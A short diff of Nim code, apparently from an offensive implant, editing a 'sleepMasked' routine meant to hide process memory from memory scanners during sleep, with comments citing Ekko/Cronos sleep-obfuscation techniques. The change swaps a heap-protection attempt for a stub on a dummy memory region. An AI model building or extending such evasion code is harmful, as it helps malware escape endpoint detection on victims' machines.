@@ -69,17 +69,8 @@ proc initSleepKey*() =
   xorSleepKey = uint64(rand(high(int64)))
 
 proc sleepMasked*(ms: int) =
-  ## XOR-encrypt the stack region during sleep to hide memory contents.
-  ## Simple version: uses VirtualProtect PAGE_NOACCESS on the heap during sleep.
+  ## PAGE_NOACCESS on a dummy anonymous region during sleep — hides heap from memory scanners.
   if ms <= 0: return
-
-  # PAGE_NOACCESS on the process heap during sleep — memory scanner cannot read it.
-  let heap = GetProcessHeap()
-  let size = HeapSize(heap, 0, cast[LPVOID](heap))  # approximate
-
-  # Simpler approach: just sleep with VirtualLock trick
-  # For now: just sleep — full Ekko/Cronos requires asm ROP chains not supported in Nim easily.
-  # PAGE_NOACCESS approach on a safe anonymous region:
   var dummySize: SIZE_T = 4096
   let dummy = VirtualAlloc(nil, dummySize, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
   if dummy != nil:
